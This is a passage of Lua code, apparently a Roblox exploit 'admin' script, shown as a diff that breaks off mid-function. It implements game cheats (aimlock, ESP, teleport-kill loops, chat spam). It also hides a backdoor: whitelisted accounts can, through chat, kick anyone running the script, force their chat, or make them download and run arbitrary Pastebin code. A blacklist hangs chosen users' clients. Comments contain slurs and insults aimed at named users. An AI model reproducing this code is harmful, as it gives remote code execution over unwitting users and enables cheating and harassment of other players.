+CText.TextWrapped = true
+
+CmdFrame.BackgroundColor3 = Color3.new(0, 0.000738177, 0.000738177)
+CmdFrame.BorderSizePixel = 0
+CmdFrame.Position = UDim2.new(0, 0, -4, 0)
+CmdFrame.Size = UDim2.new(1, 0, 4, 0)
+CmdFrame.Visible = false
+
+local function Create(Text)
+if not Text then return end
+        local CmdList = Instance.new("TextLabel",CmdFrame)
+        CmdList.BackgroundColor3 = Color3.new(0.666667, 0, 0)
+        CmdList.BackgroundTransparency = 0.20000000298023
+        CmdList.BorderSizePixel = 0
+        CmdList.Position = UDim2.new(-10, 0, 0, 0)
+        CmdList.Size = UDim2.new(1, 0, 0, 20)
+        CmdList.Font = Enum.Font.SourceSansLight
+        CmdList.Text = Text
+        CmdList.TextColor3 = Color3.new(0.952941, 0.952941, 0.952941)
+        CmdList.TextScaled = true
+        CmdList.TextWrapped = true
+end
+
+local function Changed()
+pcall(function() 
+        if CText.Text ~= "" then
+                CmdFrame.Visible = true
+                local PositionMatch = 0
+                for _,cmd in pairs(CmdFrame:GetChildren()) do
+                                if string.find(string.lower(cmd.Text),string.lower(CText.Text)) then
+                                        cmd.Position = UDim2.new(0, 0, 0, 2 + (PositionMatch * 20))
+                                        PositionMatch = PositionMatch + 1
+                                        if cmd.Position == UDim2.new(0, 0, 0, 142) then
+                                                cmd.Position = UDim2.new(-10, 0, 0, 0)
+                                                PositionMatch = PositionMatch - 1
+                                        end
+                                else
+                                        cmd.Position = UDim2.new(-10, 0, 0, 0)
+                                end
+                        end
+                else
+                        CmdFrame.Visible = false
+                end
+        end)
+end
+
+MainFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+MainFrame.BackgroundTransparency = 0.250
+MainFrame.BorderColor3 = Color3.fromRGB(218, 133, 65)
+MainFrame.BorderSizePixel = 8
+MainFrame.Position = UDim2.new(0,695,0,297)
+MainFrame.Size = UDim2.new(0,495,0,431)
+MainFrame.AnchorPoint = Vector2.new(0,0)
+MainFrame.Visible = false 
+MainFrame.Active = true 
+MainFrame.Draggable = true 
+
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(218, 133, 65)
+ScrollingFrame.BackgroundTransparency = 0.400
+ScrollingFrame.BorderColor3 = Color3.fromRGB(0,0,0)
+ScrollingFrame.BorderSizePixel = 5
+ScrollingFrame.Position = UDim2.new(0.0880542845,0,0.126374945,0)
+ScrollingFrame.Size = UDim2.new(0,411,0,348)
+
+SearchBar.BackgroundColor3 = Color3.fromRGB(218, 133, 65)
+SearchBar.BackgroundTransparency = 0.400
+SearchBar.BorderColor3 = Color3.fromRGB(0,0,0)
+SearchBar.BorderSizePixel = 5
+SearchBar.Position = UDim2.new(0.0880542994,0,0.0598471165,0)
+SearchBar.Size = UDim2.new(0,411,0,28)
+SearchBar.Font = Enum.Font.SourceSansBold
+SearchBar.PlaceholderColor3 = Color3.fromRGB(255,255,255)
+SearchBar.Text = "Search"
+SearchBar.TextColor3 = Color3.fromRGB(218, 133, 65)
+SearchBar.TextSize = 24.000
+
+Credits.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Credits.BackgroundTransparency = 0.250
+Credits.BorderColor3 = Color3.fromRGB(218, 133, 65)
+Credits.BorderSizePixel = 5
+Credits.Position = UDim2.new(-0.00101006031,0,0.948468387,0)
+Credits.Size = UDim2.new(0,187,0,22)
+Credits.Font = Enum.Font.SourceSansBold
+Credits.Text = "Made by NanoVisions"
+Credits.TextColor3 = Color3.fromRGB(255,255,255)
+Credits.TextSize = 14.000
+
+DmgIndicator.BackgroundColor3 = Color3.fromRGB(0,0,0)
+DmgIndicator.BackgroundTransparency = 0.700
+DmgIndicator.BorderSizePixel = 3
+DmgIndicator.Position = UDim2.new(0,0,1.00488257,0)
+DmgIndicator.Size = UDim2.new(0,385,0,50)
+DmgIndicator.Font = Enum.Font.SourceSans
+DmgIndicator.Text = ''
+DmgIndicator.TextColor3 = Color3.fromRGB(218, 133, 65)
+DmgIndicator.TextScaled = true
+DmgIndicator.TextSize = 30.000
+DmgIndicator.TextWrapped = true
+DmgIndicator.Visible = false 
+
+local function CreateCommand(Pos,Text)
+        local ActualCommands = Instance.new('TextLabel',ScrollingFrame)
+        ActualCommands.BackgroundColor3 = Color3.fromRGB(27, 26, 26)
+        ActualCommands.BackgroundTransparency = 0.200
+        ActualCommands.BorderColor3 = Color3.fromRGB(218, 133, 65)
+        ActualCommands.Position = Pos
+        ActualCommands.Size = UDim2.new(0, 382, 0, 20)
+        ActualCommands.Font = Enum.Font.SourceSansBold
+        ActualCommands.Text = Text
+        ActualCommands.TextColor3 = Color3.fromRGB(218, 133, 65)
+        ActualCommands.TextSize = 14.000
+        ActualCommands.TextScaled = true 
+        ActualCommands.TextWrapped = true
+end
+
+SearchBar.Changed:Connect(function()
+local Index = 0
+        if SearchBar.Text then
+                for _,v in pairs(ScrollingFrame:GetChildren()) do
+                        if not string.find(v.Text:lower(),SearchBar.Text:lower()) then
+                                v.Visible = false
+                        else
+                                v.Visible = true
+                                Index = Index + 1
+                                v.Position = UDim2.new(0.0150422715,0,0.0127776451,0 + (Index * 20))
+                        end
+                end
+        end
+end)
+
+local CoolkidTable = {
+    ['1839179663']      = {
+                ['Name']   = "NanoVisions | Creator";
+                ['Colour'] = Color3.fromRGB(218, 133, 65);
+                ['Access'] = true;
+        };
+    ['158124494']    = {
+                ['Name']   = "Ve_1m";
+                ['Colour'] = Color3.fromRGB(196, 40, 28);
+                ['Access'] = true;
+        };
+    ['2525112711']      = {
+                ['Name']   = "yDrillin";
+                ['Colour'] = Color3.fromRGB(196, 40, 28);
+                ['Access'] = true;
+        };
+    ['']    = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(57,52,52);
+                ['Access'] = true;
+        };
+    ['']   = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(0,255,255);
+                ['Access'] = true;
+        };
+        ['']   = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(255,255,255);
+                ['Access'] = true;
+        };
+        ['']   = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(212,224,255);
+                ['Access'] = true;
+        };
+    ['']   = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(212,224,255);
+                ['Access'] = true;
+        };
+        ['']  = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(212,224,255);
+                ['Access'] = true;
+        };
+        ['']    = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(176,16,16);
+                ['Access'] = true;
+        };
+        ['']    = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(255,0,0);
+                ['Access'] = true;
+        };
+        ['']    = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(215,19,19);
+                ['Access'] = true;
+        };
+        ['']  = {
+                ['Name'] = "";
+                ['Colour'] = Color3.fromRGB(192,6,6);
+                ['Access'] = true;
+        };
+        ['']   = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(107,50,124);
+                ['Access'] = true;
+        };
+        ['']     = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(12,4,134);
+                ['Access'] = true;
+        };
+        [''] = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(12,4,134);
+                ['Access'] = true;
+        };
+        ['']  = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(194,23,255);
+                ['Access'] = true;
+        };
+        ['']   = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(194,23,255);
+                ['Access'] = true;
+        };
+        ['']  = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(194,23,255);
+                ['Access'] = true;
+        };
+        ['']   = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(36,89,237);
+                ['Access'] = false;
+        };
+        ['']  = { 
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(125,0,0);
+                ['Access'] = false;
+        };
+        ['']   = { 
+                ['Name']   = ")";
+                ['Colour'] = Color3.fromRGB(125,0,0);
+                ['Access'] = false;
+        };
+        ['']   = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(102,0,0);
+                ['Access'] = true;
+        };
+        ['']      = {
+                ['Name'] = "";
+                ['Colour'] =  Color3.fromRGB(255,248,11);
+                ['Access'] = false;
+        };
+        ['']   = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(52,152,219);
+                ['Access'] = true;
+        };
+        ['']   = {
+                ['Name']   = "";
+                ['Colour'] = Color3.fromRGB(52,152,219);
+                ['Access'] = true;
+        };
+        ['']   = {
+                ['Name'] = "";
+                ['Colour'] = Color3.fromRGB(255,0,70);
+                ['Access'] = false;
+        };
+        ['']   = {
+                ['Name'] = "";
+                ['Colour'] = Color3.fromRGB(0,255,0);
+                ['Access'] = false;
+        };
+        ['']   = {
+                ['Name'] = "";
+                ['Colour'] = Color3.fromRGB(255,0,0);
+                ['Access'] = true;
+        };
+        ['']  = {
+                ['Name'] = "";
+                ['Colour'] = Color3.fromRGB(178,242,255);
+                ['Access'] = true;
+        };
+        ['']    = {
+                ['Name'] = "";
+                ['Colour'] = Color3.fromRGB(0,1,0);
+                ['Access'] = true;
+        };
+        [''] = {
+                ['Name'] = "";
+                ['Colour'] = Color3.fromRGB(235,31,31);
+                ['Access'] = true;
+        }
+}
+local Debounce = false 
+local function ColourChanger(T)
+        if T:IsA'Trail' and not CoolkidTable[tostring(LP.UserId)] then
+                T.Color = BulletColour
+        end
+        if T:IsA'ObjectValue' and T.Name == "creator" and not Debounce then
+                local Thing = T.Value
+                local Method,Tool = Char(Thing)
+                b(Thing.Name.." has "..Method.." from "..math.floor((GetChar().Head.Position - Thing.Head.Position).magnitude).." studs with a "..Tool.Name)
+                if Tool.Name == "Shotty" then 
+                        Debounce = true 
+                        wait(0.7)
+                        Debounce = false 
+                end 
+        end
+end
+
+local function HealthChanged(Health)
+        if Health <= HealBotHealth and HealBot and not TpBypass then 
+                if GrabThing("Burger",GetChar().Head.CFrame) then
+                        local Hamborger = LP.Backpack:FindFirstChild'Burger'
+                        if Hamborger then 
+                                Hamborger.Parent = GetChar()
+                                Hamborger:Activate() -- CHEEMS
+                                repeat RunService.Heartbeat:Wait() until Hamborger.Parent ~= LP.Character
+                        end
+                end -- yeah I copy pasted it from my heal cmd DEAL WITH IT 
+                if GrabThing("Drink",GetChar().Head.CFrame) then
+                        local Drink = LP.Backpack:FindFirstChild'Drink'
+                        if Drink then 
+                                Drink.Parent = GetChar()
+                                Drink:Activate()
+                        end 
+                end             
+        end
+end 
+
+LP.CharacterAdded:Connect(function()
+        GetChar():WaitForChild('Humanoid',10)
+        ChildAddedEvent = GetChar().ChildAdded:Connect(CChildAdded)
+        HumanoidStateChangedEvent = GetChar().Humanoid.StateChanged:Connect(HumanoidState)
+        HumanoidCAdded = GetChar().Humanoid.DescendantAdded:Connect(ColourChanger)
+        HumanoidHealthChanged = GetChar().Humanoid.HealthChanged:Connect(HealthChanged)
+        GetChar().Humanoid.WalkSpeed = SpawnWS or NormalWS
+    GetChar().Humanoid.JumpPower = SpawnJP or NormalJP
+        GetChar().Humanoid.HipHeight = SpawnHH or NormalHH
+        if FeLoop then 
+                local Humanoid = GetChar().Humanoid:Clone()
+                GetChar().Humanoid:Destroy()
+                Humanoid.Parent = GetChar()
+                workspace.CurrentCamera.CameraSubject = GetChar()
+        end 
+        if PlayOnDeath then
+                wait()
+                local Tool = LP.Backpack:WaitForChild('BoomBox')
+                if Tool then 
+                        Tool.Parent = GetChar() 
+                        wait()
+                        Tool:FindFirstChildOfClass'RemoteEvent':FireServer("play",PlayOnDeath)
+                        Tool.Parent = LP.Backpack
+                end
+        end
+end)
+
+LP.CharacterRemoving:Connect(function()
+        ChildAddedEvent:Disconnect()
+        HumanoidStateChangedEvent:Disconnect()
+        HumanoidCAdded:Disconnect()
+        HumanoidHealthChanged:Disconnect()
+        HR = nil
+        flying = false
+end)
+
+UserInput.InputBegan:Connect(function(Key)
+if UserInput:GetFocusedTextBox() then return end
+local PartFound = GetChar():FindFirstChild'HumanoidRootPart' or GetChar():FindFirstChild'Torso'
+        if Key.KeyCode == Enum.KeyCode.LeftControl then
+                if AirWalkOn then 
+                        AirWalk.Size = Vector3.new(0,-1,0)
+                end
+                if Normalwalk and ControlSpeed == 8 then return end
+                GetChar().Humanoid.WalkSpeed = ControlSpeed
+        end
+        if Key.KeyCode == Enum.KeyCode.LeftShift then
+                KeyTable['Shift'] = true 
+                if Normalwalk and ShiftSpeed == 25 then return end 
+                GetChar().Humanoid.WalkSpeed = ShiftSpeed
+        end
+        if Key.KeyCode == Enum.KeyCode.W then 
+                KeyTable['w'] = true 
+        end
+        if Key.KeyCode == Enum.KeyCode.A then 
+                KeyTable['a'] = true 
+        end
+        if Key.KeyCode == Enum.KeyCode.S then 
+                KeyTable['s'] = true 
+        end
+        if Key.KeyCode == Enum.KeyCode.D then 
+                KeyTable['d'] = true 
+        end
+        if Key.KeyCode == Enum.KeyCode.E and GetChar():FindFirstChildOfClass'Tool' and not GetChar():FindFirstChild'KO' then 
+                LP.Backpack.ServerTraits.Finish:FireServer(LP.Backpack.Punch)
+        end 
+        if Key.KeyCode == Enum.KeyCode.Space and AirWalkOn then 
+                PartFound.CFrame = PartFound.CFrame + Vector3.new(0,5,0)
+        end
+        if Key.KeyCode == Enum.KeyCode.Quote then 
+                CText:CaptureFocus()
+                Cframe:TweenPosition(UDim2.new(0.015,0,0.95,0),"Out","Elastic",0.5,true)
+                wait()
+                CText.Text = ""
+                UserInput.TextBoxFocusReleased:Wait()
+                local Command = CText.Text
+                CText.Text = ""
+                CheckCommand(Command)
+                Cframe:TweenPosition(UDim2.new(0.015,0,1,0),"Out","Quad",0.5,true)
+        end
+        if ClickTpKey and ClickTpKey ~= "" and Key.KeyCode == Enum.KeyCode[ClickTpKey:upper()] and Mouse.Target then
+                if (Mouse.Hit.Position - PartFound.Position).magnitude < 50 then 
+                        PartFound.CFrame = CFrame.new(Mouse.Hit.p + Vector3.new(0,5,0))
+                else
+                        Teleport(CFrame.new(Mouse.Hit.p + Vector3.new(0,5,0)))
+                end
+        end
+        if Keys then 
+                for _,v in pairs(Keys) do 
+                        if v and Enum.KeyCode[v:match'[%a%d]+$':upper()] == Key.KeyCode then 
+                                CheckCommand(v:match'^[%w%s]+')
+                        end
+                end
+        end
+end)
+
+UserInput.InputEnded:Connect(function(Key)
+if UserInput:GetFocusedTextBox() then return end
+        if Key.KeyCode == Enum.KeyCode.LeftControl then
+                if AirWalkOn then
+                        AirWalk.Size = Vector3.new(5,1,5)
+                end 
+                if Normalwalk and ControlSpeed == 8 then return end
+                GetChar().Humanoid.WalkSpeed = WalkSpeed
+        end
+        if Key.KeyCode == Enum.KeyCode.W then 
+                KeyTable['w'] = false
+        end
+        if Key.KeyCode == Enum.KeyCode.A then 
+                KeyTable['a'] = false 
+        end
+        if Key.KeyCode == Enum.KeyCode.S then 
+                KeyTable['s'] = false 
+        end
+        if Key.KeyCode == Enum.KeyCode.D then 
+                KeyTable['d'] = false 
+        end
+        if Key.KeyCode == Enum.KeyCode.LeftShift and ShiftSpeed then
+                KeyTable['Shift'] = false 
+                if Normalwalk and ShiftSpeed == 25 then return end 
+                GetChar().Humanoid.WalkSpeed = WalkSpeed
+        end 
+end)
+
+Players.PlayerRemoving:Connect(function(P)
+        Unesp(P)
+end)
+
+CText.FocusLost:Connect(function(Enter)
+        Cframe:TweenPosition(UDim2.new(0.015, 0, 1, 0),"Out","Quad",0.5,true)
+        if Enter then 
+                local Command = CText.Text
+                CText.Text = ""
+                CheckCommand(Command)
+        end
+end)
+
+AddCommand(function(Arguments)
+        if Arguments[1] then
+                local File = loadfile("CyAdminPlugins\\"..Arguments[1])
+                if not File then 
+                        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Syntax Error (Can't output it since loadfile gay)","All")
+                        return 
+                else 
+                        local W,E = pcall(File)
+                        if not W then 
+                                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Runtime Error"..E,"All")
+                                return 
+                        end 
+                end 
+                local T = Temp()
+                for i = 1,#Commands do
+                        if not table.find(T,Commands[i].Name) then 
+                                Create(Commands[i].Name)
+                                CreateCommand(UDim2.new(0.0150422715,0,0.0127776451,0 + (i * 20)),Commands[i].Name.." "..Commands[i].Help)
+                        end 
+                end 
+        end 
+end,"runplugin",{},"Loads plugins (no it doesn't refresh them so don't be retarded") 
+-- DON'T ASK ABOUT IT ANYONE WHO READS THIS CODE OK?
+
+ChildAddedEvent = GetChar().ChildAdded:Connect(CChildAdded)
+HumanoidStateChangedEvent = GetChar().Humanoid.StateChanged:Connect(HumanoidState)
+HumanoidCAdded = GetChar().Humanoid.DescendantAdded:Connect(ColourChanger)
+HumanoidHealthChanged = GetChar().Humanoid.HealthChanged:Connect(HealthChanged)
+Mouse.Button1Down:Connect(Button1Down)
+Mouse.Button2Down:Connect(Button2Down)
+LP.Chatted:Connect(CheckCommand)
+UserInput.JumpRequest:Connect(DoubleJump)
+CText:GetPropertyChangedSignal("Text"):Connect(Changed)
+RunService.Stepped:Connect(Stepped)
+
+spawn(function()
+        while true do
+        local Char = GetChar()
+        if Char then 
+                local PartFound = Char:FindFirstChild'HumanoidRootPart' or Char:FindFirstChild'Torso'
+                        if Char:FindFirstChildOfClass'Humanoid' and UseDraw then
+                                local Tool = Char:FindFirstChildOfClass'Tool'
+                                if Tool and Tool:FindFirstChild'Ammo' then 
+                                        DrawingT.Text = "Current WalkSpeed: "..Char.Humanoid.WalkSpeed.."\nSprinting Speed: "..ShiftSpeed.."\nCrouching Speed: "..ControlSpeed.."\nJumpPower: "..Char.Humanoid.JumpPower.."\nFlying: "..tostring(flying).."\nNoclipping: "..tostring(Noclipping).."\nAimlock Target: "..tostring(AimlockTarget).."\n"..Tool.Name.." Clips & Ammo: "..Tool.Clips.Value..":"..Tool.Ammo.Value
+                                else 
+                                        DrawingT.Text = "Current WalkSpeed: "..Char.Humanoid.WalkSpeed.."\nSprinting Speed: "..ShiftSpeed.."\nCrouching Speed: "..ControlSpeed.."\nJumpPower: "..Char.Humanoid.JumpPower.."\nFlying: "..tostring(flying).."\nNoclipping: "..tostring(Noclipping).."\nAimlock Target: "..tostring(AimlockTarget) 
+                                end
+                        end
+                        if PartFound and Blinking then 
+                                if BlinkMode == "None" or BlinkMode == "Shift" and KeyTable['Shift'] then
+                                        if KeyTable['w'] then 
+                                                PartFound.CFrame = PartFound.CFrame * CFrame.new(0,0,-BlinkSpeed)
+                                        end 
+                                        if KeyTable['a'] then 
+                                                PartFound.CFrame = PartFound.CFrame * CFrame.new(-BlinkSpeed,0,0)
+                                        end
+                                        if KeyTable['s'] then 
+                                                PartFound.CFrame = PartFound.CFrame * CFrame.new(0,0,BlinkSpeed)
+                                        end
+                                        if KeyTable['d'] then 
+                                                PartFound.CFrame = PartFound.CFrame * CFrame.new(BlinkSpeed,0,0)
+                                        end
+                                end 
+                        end
+                        wait()
+                end
+        end 
+end)
+
+if PartTable then 
+        spawn(function()
+                while wait() do
+                        if LP.Character:FindFirstChildOfClass'Humanoid' and LP.Character.Humanoid.HipHeight > 0 or AirWalkOn and LP.Character.Humanoid.FloorMaterial == Enum.Material.Neon and not LP.Character.Humanoid.Sit then 
+                                local JP = LP.Character.Humanoid.JumpPower
+                                LP.Character.Humanoid.JumpPower = 1.5
+                                LP.Character.Humanoid:ChangeState(3)
+                                wait(0.2)
+                                LP.Character.Humanoid.JumpPower = JP
+                        end
+                end
+        end)
+end
+
+spawn(function()
+        while wait(SpamDelay) do 
+                if Spamming and SpamMessage then 
+                        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SpamMessage,"All")
+                end
+        end 
+end)
+
+spawn(function()
+        while wait(10) do 
+                if AntiAfk then 
+                        keypress(0x20)
+                end
+        end
+end)
+
+local function espcool(Plr)
+        local Esp1 = Instance.new('BillboardGui',Plr.Character.Head)
+        Esp1.Adornee = Plr.Character.Head
+        Esp1.Size = UDim2.new(0,100,0,100)
+        Esp1.StudsOffset = Vector3.new(0,1,0)
+        Esp1.AlwaysOnTop = true 
+        local Esp2 = Instance.new('TextLabel',Esp1)
+        Esp2.BackgroundTransparency = 1
+        Esp2.Text = CoolkidTable[tostring(Plr.UserId)].Name
+        Esp2.Position = UDim2.new(0,0,0,0)
+        Esp2.Size = UDim2.new(1,0,0,40)
+        Esp2.TextColor3 = CoolkidTable[tostring(Plr.UserId)].Colour
+        Esp2.TextStrokeTransparency = 0.5
+        Esp2.TextSize = 15
+        Esp2.TextStrokeColor3 = CoolkidTable[tostring(Plr.UserId)].Colour
+        if Plr.Character:FindFirstChild'Humanoid' then 
+                Plr.Character.Humanoid.DescendantAdded:Connect(function(T)
+                        if T:IsA'Trail' then 
+                                T.Color = ColorSequence.new(CoolkidTable[tostring(Plr.UserId)].Colour)
+                        end
+                end)
+        end
+        local Table = {}
+        for i,v in pairs(Plr.Backpack:GetChildren()) do if v:IsA'Tool' and v:FindFirstChild'Fire' then table.insert(Table,v) end end 
+        for i,v in pairs(Plr.Character:GetChildren()) do if v:IsA'Tool' and v:FindFirstChild'Fire' then table.insert(Table,v) end end
+        -- To make sure all tools get set ugly I know lol
+        for Index,Tool in pairs(Table) do 
+                for Index2,Part in pairs(Tool:GetDescendants()) do 
+                        if Part:IsA'UnionOperation' or Part:IsA'Part' or Part:IsA'MeshPart' then 
+                                if Part:IsA'UnionOperation' then
+                                        Part.UsePartColor = true
+                                end 
+                                Part.Material = "Neon" 
+                                Part.Color = CoolkidTable[tostring(Plr.UserId)].Colour
+                        end
+                end
+        end
+        Plr.Character.ChildAdded:Connect(function(T)
+                if T:IsA'Tool' and T:FindFirstChild'Fire' or T:FindFirstChild'Shoot' then 
+                        for Index2,Part in pairs(T:GetDescendants()) do 
+                                if Part:IsA'UnionOperation' or Part:IsA'Part' or Part:IsA'MeshPart' then 
+                                        if Part:IsA'UnionOperation' then
+                                                Part.UsePartColor = true
+                                        end 
+                                        Part.Material = "Neon" 
+                                        Part.Color = CoolkidTable[tostring(Plr.UserId)].Colour
+                                end
+                        end
+                end
+        end)
+end
+
+local PlayersX = Players:GetPlayers()
+for i = 1,#PlayersX do
+        local Plr = PlayersX[i]
+        if CoolkidTable[tostring(Plr.UserId)] and Plr.Character:FindFirstChild'Head' then 
+                espcool(Plr)
+                Plr.CharacterAdded:Connect(function()
+                        local Head = Plr.Character:WaitForChild('Head',10)
+                        if Head then
+                                espcool(Plr)
+                        end
+                end)
+                if CoolkidTable[tostring(Plr.UserId)].Access then 
+                Plr.Chatted:Connect(function(Chat)
+                        local Arguments = string.split(Chat:sub(2)," ")
+                        local Player = PlrFinder(Arguments[1])
+                        table.remove(Arguments,1)
+                        if Player and Player == LP or typeof(Player) == "table" then 
+                                if not CoolkidTable[tostring(LP.UserId)] then 
+                                        if Chat:sub(1,1) == "`" then 
+                                                CheckCommand(table.concat(Arguments," "))
+                                        end
+                                        if Chat:sub(1,1) == "[" then 
+                                                LP:Kick('You have been kicked by '..Plr.Name.." for "..table.concat(Arguments," "))
+                                        end
+                                        if Chat:sub(1,1) == "~" then 
+                                                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("abc123","All")
+                                        end
+                                        if Chat:sub(1,1) == "]" then
+                                                loadstring(game:HttpGet("https://pastebin.com/raw/"..Arguments[1],true))()
+                                        end 
+                                end 
+                        end
+                end)
+        end
+        end
+        if Plr ~= LP then 
+                local Chatted;
+                Chatted = Plr.Chatted:Connect(function(A) -- had to make it a function instead of calling :Wait() on it or it would yield the whole loop lmao
+                        if A == "" then
+                                Chatted:Disconnect()
+                                Players:Chat("")
+                                local abc123;
+                                for i = 1,#PlayerTable do 
+                                        if PlayerTable[i] and PlayerTable[i][2] == Plr then 
+                                                PlayerTable[i][5] = "true"
+                                                abc123 = true
+                                        end
+                                end
+                                table.insert(AdminUsers,Plr.UserId)
+                                if not abc123 and UseDraw then 
+                                        espPlayer(Plr,nil,true)
+                                end
+                        end
+                end)
+        end
+end
+
+Players.PlayerAdded:Connect(function(Plr)
+        if CoolkidTable[tostring(Plr.UserId)] then
+                Plr.CharacterAdded:Connect(function()
+                        if CoolkidTable[tostring(Plr.UserId)].Access then 
+                                Plr.Chatted:Connect(function(Chat)
+                                        local Arguments = string.split(Chat:sub(2)," ")
+                                        local Player = PlrFinder(Arguments[1])
+                                        table.remove(Arguments,1)
+                                        if Player and Player == LP or typeof(Player) == "table" then 
+                                                if not CoolkidTable[tostring(LP.UserId)] then 
+                                                        if Chat:sub(1,1) == "`" then 
+                                                                CheckCommand(table.concat(Arguments," "))
+                                                        end
+                                                        if Chat:sub(1,1) == "[" then 
+                                                                LP:Kick('You have been kicked by '..Plr.Name.." for "..table.concat(Arguments," "))
+                                                        end
+                                                        if Chat:sub(1,1) == "~" then 
+                                                                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("abc123","All")
+                                                        end
+                                                        if Chat:sub(1,1) == "]" then
+                                                                loadstring(game:HttpGet("https://pastebin.com/raw/"..Arguments[1],true))()
+                                                        end 
+                                                end 
+                                        end
+                                end)
+                        end
+                        local Head = Plr.Character:WaitForChild('Head',10)
+                        if Head then 
+                                espcool(Plr)
+                        end
+                end)
+        end
+        local p;
+        P = Plr.Chatted:Connect(function(A)
+                if A == "" then 
+                        P:Disconnect()
+                        Players:Chat("")
+                        local abc123;
+                        for i = 1,#PlayerTable do 
+                                if PlayerTable[i] and PlayerTable[i][2] == Plr then 
+                                        PlayerTable[i][5] = "true"
+                                        abc123 = true
+                                end
+                        end
+                        table.insert(AdminUsers,Plr.UserId)
+                        if not abc123 and UseDraw then 
+                                espPlayer(Plr,nil,true)
+                        end
+                end
+        end)
+end)
+
+local FileDir,isFolder,makeFolder = syn_io_listdir or list_files,syn_io_isfolder or isfolder,syn_io_makefolder or makefolder
+
+if FileDir and isFolder and makeFolder then 
+        if not isFolder'CyAdminPlugins' then 
+                makeFolder('CyAdminPlugins')
+        end 
+        for _,v in pairs(FileDir'CyAdminPlugins') do 
+                local WorkingFile = loadfile(v)
+                if not WorkingFile then
+                        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("There was a syntax error (sadly can\'t output it as loadfile is gay)","All")
+                else 
+                        local Work,Error = pcall(WorkingFile) 
+                        if not Work then 
+                                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Runtime Error"..Error,"All")
+                        end
+                end
+        end
+end 
+
+local BlacklistTable = {
+        [251848039] = true;     -- Cyruzsz | Reason: annoying skid,dick rider
+        [57890959] = true;      -- Fevlix | Reason: annoying skid 
+        [339273796] = true;     -- endlessjj Reason: Forget 
+        [363849133] = true;             -- vxonc | Reason: annoying skid 
+        [1618476217] = true;    -- DranghetaSINS | Reason: Alt of V 
+        [1508268550] = true;    -- Zerulogy | Reason: Alt of V 
+        [1271632090] = true;    -- OrphanageKid | Reason: annoying
+        [296541717] = true;     -- R4ELEEN | Reason: https://media.discordapp.net/attachments/710938129896308736/710948890550992906/unknown.png
+        [1186330995] = true;    -- rheaper | Reason: Oreo Gang
+        [114164798] = true;     -- Slays | Reason: No temptations fat cunt (blacklisted myself)
+        [1417460726] = true;    -- 6tpz | Reason: Oreo Gang
+        [20165690] = true;              -- sh6un | Reason: Oreo Gang
+        [101320782] = true;     -- fulldesire | Reason: Oreo Gang
+        [838770714] = true;     -- Synshop | Reason: Oreo Gang 
+        [1539633029] = true;    -- hopoffmygirI | Reason: Oreo Gang
+}
+
+if BlacklistTable[LP.UserId] or LP:IsInGroup(5152759) or string.find(LP.Name:lower(),"lynx") then 
+        while true do end -- crash that dumb ass skid! 
+end 
+
+for i = 1,#Commands do
+local Alias = Commands[i].Alias
+        Create(Commands[i].Name)
+        for v = 1,#Alias do
+                Create(Alias[v])
+        end
+        CreateCommand(UDim2.new(0.0150422715,0,0.0127776451,0 + (i * 20)),Commands[i].Name.." "..Commands[i].Help)
+end
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+    if string.find(msg,"+s ") then -- finds ,s typed
+        local name = string.gsub(msg,"+s ", "") -- removes ,s and focuses on name of plr 
+        for i,v in pairs (game.Players:GetChildren()) do -- gets all player names
+            if string.sub(string.lower(v.Name) , 1, string.len(name)) == string.lower(name) then -- shortens the length of name
+                game.Players.LocalPlayer.Backpack.Shotty.Parent = game.Players.LocalPlayer.Character
+                for i = 1,450 do
+                    while true do
+                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Torso.CFrame + Vector3.new(0,0,7)
+wait()
+ 
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Torso.CFrame + Vector3.new(0,0,-7)
+wait()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.Character.Torso.CFrame + Vector3.new(-7,0, 0)
+wait()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.Character.Torso.CFrame + Vector3.new(7,0,0)
+wait()
+ 
+        game.Players.LocalPlayer.Character.Shotty.Fire:FireServer(v.Character.Head.CFrame)
+end
+                end
+            end
+        end
+ 
+    end
+end)
+ 
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+    if string.find(msg,"+g ") then -- finds ,s typed
+        local name = string.gsub(msg,"+g ", "") -- removes ,s and focuses on name of plr 
+        for i,v in pairs (game.Players:GetChildren()) do -- gets all player names
+            if string.sub(string.lower(v.Name) , 1, string.len(name)) == string.lower(name) then -- shortens the length of name
+                game.Players.LocalPlayer.Backpack.Glock.Parent = game.Players.LocalPlayer.Character
+                for i = 1,450 do
+                    while true do
